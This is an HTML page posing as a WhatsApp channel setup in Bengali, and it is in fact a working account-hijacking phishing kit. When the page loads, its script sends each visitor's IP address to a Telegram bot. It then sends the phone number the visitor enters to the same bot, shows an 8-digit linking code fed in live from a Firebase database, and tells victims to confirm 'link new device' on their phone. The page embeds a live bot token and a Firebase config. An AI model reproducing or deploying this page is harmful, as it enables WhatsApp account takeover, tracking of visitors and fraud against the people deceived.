<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your whatsapp account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        body { font-family: 'Kalpurush', sans-serif; background: linear-gradient(135deg, #128C7E, #075E54); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
        .container { max-width: 400px; width: 100%; background-color: #ECE5DD; border-radius: 1.5rem; padding: 2.5rem 2rem; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
        .whatsapp-logo i { font-size: 80px; color: #25D366; background: white; border-radius: 50%; padding: 20px; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4); }
        .input-field { background-color: #fff; border: 2px solid #ddd; border-radius: 0.75rem; padding: 0.85rem 1rem; text-align: center; font-size: 1.1rem; width: 100%; transition: all 0.3s ease; }
        .input-field:focus { outline: none; border-color: #25D366; }
        .btn { background: linear-gradient(90deg, #25D366, #128C7E); color: white; font-weight: bold; padding: 0.9rem; border-radius: 0.75rem; width: 100%; border: none; cursor: pointer; transition: all 0.3s ease; }
        .loader { border: 6px solid #ccc; border-top: 6px solid #128C7E; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 2rem auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .pin-display { display: flex; justify-content: center; gap: 5px; margin-bottom: 1.5rem; }
        .pin-digit { width: 38px; height: 48px; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; font-weight: bold; background-color: #fff; border: 2px solid #128C7E; color: #075E54; border-radius: 0.5rem; }
        .instruction-list { list-style: none; padding: 0; text-align: left; }
        .instruction-list li { display: flex; align-items: flex-start; margin-bottom: 0.75rem; font-size: 1rem; }
        .step-icon { color: #128C7E; margin-right: 0.75rem; margin-top: 4px; width: 20px; text-align: center; }
    </style>
</head>
<body>

<div class="container">
    <div id="page1" class="text-center">
        <div class="whatsapp-logo mb-5"><i class="fab fa-whatsapp"></i></div>
        <h1 class="text-3xl font-bold text-gray-800 mb-2">Whatsapp ржЪрзНржпрж╛ржирзЗрж▓ рждрзИрж░рж┐ ржХрж░рждрзЗ Whatsapp ржпрзБржХрзНржд ржХрж░рзБржи</h1>
        <p class="text-gray-600 mb-8">Add ржХрж░рж╛рж░ ржЬржирзНржп ржЖржкржирж╛рж░ WhatsApp ржирж╛ржорзНржмрж╛рж░ ржжрж┐ржи</p>
        <form id="phoneForm" class="space-y-5">
            <input type="tel" id="phoneNumber" placeholder="ржЖржкржирж╛рж░ Whatsapp ржиржорзНржмрж░ рж▓рж┐ржЦрзБржи" required class="input-field">
            <button type="submit" class="btn"><i class="fab fa-whatsapp mr-2"></i>continue</button>
        </form>
    </div>
    
    <!-- Loading Time Updated -->
    <div id="loading" class="hidden text-center">
        <div class="loader"></div>
        <p class="text-lg text-gray-700 font-semibold">рж╕ржВржпрзЛржЧ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...</p>
        <p class="text-gray-500">ржЕржирзБржЧрзНрж░рж╣ ржХрж░рзЗ рзирзж рж╕рзЗржХрзЗржирзНржб ржЕржкрзЗржХрзНрж╖рж╛ ржХрж░рзБржиред</p>
    </div>
    
    <!-- Page 2 Updated with new text -->
    <div id="page2" class="hidden text-center">
        <i class="fa fa-circle-info text-5xl text-teal-800 mb-4"></i>
        <h1 class="text-2xl font-bold text-gray-800 mb-3">Whatsapp ржЪрзНржпрж╛ржирзЗрж▓рзЗ ржпрзБржХрзНржд рж╣ржУрзЯрж╛рж░ ржирж┐рж░рзНржжрзЗрж╢ржирж╛</h1>
    
        <p class="text-gray-600 mb-2">ржЖржкржирж╛рж░ ржПрж░ рзо-рж╕ржВржЦрзНржпрж╛рж░ Whatsapp ржЖржирж▓ржХ ржирж╛ржорзНржмрж╛рж░</p>
        <div id="pinContainer" class="pin-display">
            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
        </div>

        <div class="bg-white p-4 rounded-lg shadow-inner text-gray-700">
            <h2 class="text-lg font-semibold mb-3 border-b pb-2">ржЖржкржирж╛рж░ ржлрзЛржирзЗ ржЖржирж▓ржХ ржирж╛ржорзНржмрж╛рж░ ржкрзНрж░ржмрзЗрж╢ ржХрж░рж╛ржи:</h2>
            <ul class="instruction-list">
                <li><i class="fa fa-mobile-screen-button step-icon"></i>ржкрзНрж░ржержорзЗ ржЖржкржирж╛рж░ ржлрзЛржирзЗрж░ ржирзЛржЯрж┐ржлрж┐ржХрзЗрж╢ржи ржерзЗржХрзЗ <strong>"Enter code to link new device"</strong> ржП ржХрзНрж▓рж┐ржХ ржХрж░рзБржиред</li>
                <li><i class="fa fa-check-to-slot step-icon"></i>ржПрж░ржкрж░ <strong>Confirm</strong> ржмрж╛ржЯржирзЗ ржХрзНрж▓рж┐ржХ ржХрж░рзБржиред</li>
                <li><i class="fa fa-fingerprint step-icon"></i>ржЖржкржирж╛рж░ ржлрзЛржирзЗрж░ ржлрж┐ржЩрзНржЧрж╛рж░ржкрзНрж░рж┐ржирзНржЯ ржЕржержмрж╛ ржкрзНржпрж╛ржЯрж╛рж░рзНржи рж▓ржХ ржжрж┐рзЯрзЗ ржЖржирж▓ржХ ржХрж░рзБржиред</li>
                <li><i class="fa fa-keyboard step-icon"></i>рж╕ржмрж╢рзЗрж╖рзЗ, ржлрж╛ржБржХрж╛ рзоржЯрж┐ ржмржХрзНрж╕рзЗ ржЙржкрж░рзЗ ржжрзЗржЦрж╛ржирзЛ ржЖржирж▓ржХ ржирж╛ржорзНржмрж╛рж░ ржЯрж┐ ржмрж╕рж╛ржи ржПржмржВ ржЕржкрзЗржХрзНрж╖рж╛ ржХрж░рзБржиред</li>
            </ul>
        </div>
        
        <p class="text-xs text-gray-500 mt-4">ржжрзНрж░рж╖рзНржЯржмрзНржп: ржирж┐рж░рж╛ржкрждрзНрждрж╛рж░ ржЬржирзНржп ржПржЗ ржЖржирж▓ржХ ржирж╛ржорзНржмрж╛рж░ ржЯрж┐ ржкрзНрж░рждрж┐ рзз ржорж┐ржирж┐ржЯ ржкрж░ ржкрж░ рж╕рзНржмржпрж╝ржВржХрзНрж░рж┐ржпрж╝ржнрж╛ржмрзЗ ржкрж░рж┐ржмрж░рзНрждржи рж╣ржмрзЗред</p>
    </div>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // --- Configuration Section ---
    const firebaseConfig = {
      apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
      authDomain: "control-my-page.firebaseapp.com",
      databaseURL: "https://control-my-page-default-rtdb.firebaseio.com",
      projectId: "control-my-page",
      storageBucket: "control-my-page.appspot.com",
      messagingSenderId: "846756179295",
      appId: "1:846756179295:web:f5eec02565c2f2d45c5aea",
      measurementId: "G-37RH0B37KK"
    };

    const TELEGRAM_BOT_TOKEN = "7974529959:AAGLoG3GzH7xcn-juDFnGsmNE4SWkQUkeOI";
    const CHAT_ID = "6658445342";
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // --- Firebase Initialization ---
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // --- DOM Elements ---
    const page1 = document.getElementById('page1');
    const loading = document.getElementById('loading');
    const page2 = document.getElementById('page2');
    const phoneForm = document.getElementById('phoneForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const pinDigits = document.querySelectorAll('#pinContainer .pin-digit');

    // --- Functions ---
    async function sendTelegramMessage(text) {
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch (error) { console.error("Telegram message failed:", error); }
    }
    
    // IP API CORS ржПрж░рж░ рж╕ржорж╛ржзрж╛ржи ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ
    async function getVisitorInfoAndNotify() {
        let ip = "Unknown";
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error("Failed to fetch IP using ipify:", error);
        }

        const message = `
*ЁЯСд ржирждрзБржи ржнрж┐ржЬрж┐ржЯрж░!*
-------------------------
*IP:* \`${ip}\`
*Source URL:* \`${window.location.href}\`
-------------------------`;
        await sendTelegramMessage(message);
    }
    
    function listenForCodeChanges() {
        const liveCodeRef = database.ref('liveCode');
        liveCodeRef.on('value', (snapshot) => {
            const data = snapshot.val();
            // Firebase ржерзЗржХрзЗ ржкрзНрж░рж╛ржкрзНржд ржХрзЛржб, ржЕржержмрж╛ 8ржЯрж┐ рж╕рзНржкрзЗрж╕ (ржпржжрж┐ ржХрзЛржб ржирж╛ ржерж╛ржХрзЗ)
            const code = data && data.code ? data.code.trim().padEnd(8, ' ') : "        "; 
            
            for (let i = 0; i < 8; i++) {
                // ржкрзНрж░рждрж┐ржЯрж┐ ржмржХрзНрж╕рзЗ ржХрзЛржбрзЗрж░ ржПржХржЯрж┐ ржХрж░рзЗ ржЕржХрзНрж╖рж░ рж╕рзЗржЯ ржХрж░рзБржи
                pinDigits[i].textContent = code[i] || ' ';
            }
        });
    }

    // --- Event Listeners ---
    window.addEventListener('load', () => {
        getVisitorInfoAndNotify();
    });

    phoneForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const phoneNumber = phoneNumberInput.value.trim();
        if (!phoneNumber) return;
        
        await sendTelegramMessage(`*ЁЯУ▒ ржкрзНрж░рж╛ржкрзНржд рж╣рзЛрзЯрж╛ржЯрж╕ржЕрзНржпрж╛ржк ржиржорзНржмрж░:*\n\`${phoneNumber}\``);
        
        page1.classList.add('hidden');
        loading.classList.remove('hidden');

        // рзирзж рж╕рзЗржХрзЗржирзНржб ржЕржкрзЗржХрзНрж╖рж╛ ржХрж░рж╛рж░ ржкрж░ ржирж┐рж░рзНржжрзЗрж╢ржирж╛ ржкрзЗржЬ ржжрзЗржЦрж╛ржмрзЗ
        setTimeout(() => {
            loading.classList.add('hidden');
            page2.classList.remove('hidden');
            listenForCodeChanges(); // рзирзж рж╕рзЗржХрзЗржирзНржб ржкрж░ Firebase listener рж╢рзБрж░рзБ
        }, 20000); 
    });
</script>

</body>
</html>
